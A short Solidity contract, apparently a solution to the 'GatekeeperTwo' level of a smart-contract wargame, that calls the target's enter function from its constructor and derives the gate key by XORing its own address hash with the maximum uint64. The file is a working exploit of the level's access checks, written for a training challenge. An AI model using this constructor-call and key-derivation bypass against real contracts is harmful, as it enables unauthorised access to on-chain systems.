// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './GatekeeperTwo.sol';

contract GatekeeperTwoHack {
    GatekeeperTwo public gatekeeperTwo;

    constructor(address _addr) {
        gatekeeperTwo = GatekeeperTwo(_addr);

        uint64 gateKey = uint64(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);

        gatekeeperTwo.enter(bytes8(gateKey));
    }
}
